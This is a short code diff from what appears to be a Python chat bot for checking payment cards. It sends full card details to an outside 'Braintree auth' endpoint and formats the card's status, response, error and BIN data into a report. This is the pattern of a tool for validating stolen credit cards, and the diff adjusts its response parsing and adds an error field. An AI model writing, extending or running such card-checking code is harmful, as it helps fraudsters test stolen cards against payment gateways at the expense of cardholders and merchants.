@@ -147,9 +147,10 @@ Retry After {after}s
                             tic = time.perf_counter()
                             authurl = f"https://teammorpho.xyz/api/braintreeauthv2.php?lista={fullcc}"
                             reqone = session.get(authurl)
-                            data = json.loads(reqone)
-                            stat = data["status"]
-                            ress = data["resp"]
+                            data = reqone.json()
+                            stat = data["stuts"]
+                            ress = data["respp"]
+                            error = data["error"]
                             fourthresp = f"""
 <b> BRAINTREE AUTH V2
 ━━━━━━━━━
@@ -235,6 +236,7 @@ Retry After {after}s
 ┠ Card - <code>{fullcc}</code> 
 ┠ Status - <code>{stat}</code> 
 ┠ Resp - <code>{ress}</code>
+┠ Error - <code>{error}</code>
 ┠－－－－－－－－－－－－－－－－
 ┠ BIN INFO
 ┠ Bin - {fbin} - {brand} - {type} - {level}
